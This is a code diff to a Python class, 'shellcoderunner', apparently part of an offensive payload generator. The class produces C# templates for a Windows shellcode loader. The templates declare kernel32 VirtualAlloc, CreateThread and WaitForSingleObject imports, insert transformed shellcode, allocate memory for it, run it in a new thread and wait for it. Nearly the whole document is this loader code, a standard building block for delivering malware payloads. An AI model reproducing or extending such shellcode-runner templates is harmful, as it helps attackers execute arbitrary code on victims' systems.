@@ -16,14 +16,8 @@ class shellcoderunner:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self) -> str:
+    def codeblocks(self) -> str:
         return """
-{imports}
-
-namespace ConsoleApp1
-{{
-    class Program
-    {{
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
@@ -32,12 +26,10 @@ namespace ConsoleApp1
 
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+"""
 
-        {codeblocks}
-
-        static void Main(string[] args)
-        {{
-            
+    def template(self) -> str:
+        return """
             {transformers}
             int size = shellcode.Length;
 
@@ -48,8 +40,4 @@ namespace ConsoleApp1
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 
             WaitForSingleObject(hThread, 0xFFFFFFFF);
-        }}
-    }}
-}}
-
 """
